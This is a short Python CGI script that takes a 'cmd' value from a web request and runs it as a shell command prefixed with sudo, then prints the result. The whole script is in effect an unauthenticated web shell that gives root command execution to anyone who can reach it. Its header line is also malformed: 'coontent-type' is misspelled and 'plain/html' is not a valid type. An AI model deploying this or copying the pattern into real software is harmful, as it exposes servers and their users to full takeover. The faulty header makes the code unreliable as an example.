#!/bin/python3
print("coontent-type: plain/html")
print()
import subprocess
import cgi
data_taker=cgi.FieldStorage()
cmd=data_taker.getvalue("cmd")



x=subprocess.getstatusoutput("sudo {}".format(cmd))
print(x[1])
